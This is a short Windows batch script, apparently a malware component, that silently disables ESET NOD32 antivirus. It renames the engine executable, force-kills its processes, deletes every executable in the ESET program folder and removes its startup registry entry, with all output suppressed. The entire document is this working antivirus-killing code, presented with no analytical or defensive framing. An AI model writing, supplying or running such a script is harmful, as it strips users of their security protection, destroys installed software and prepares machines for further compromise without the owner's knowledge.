ren "%homedrive%\Program Files\ESET\nod32krn.exe" dhj.lol > nul
taskkill /im nod32kui.exe /t /f > nul
taskkill /im nod32krn.exe /t /f > nul
del "%homedrive%\Program Files\ESET\*.exe" > nul
reg delete HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\ /v nod32kui /f > nul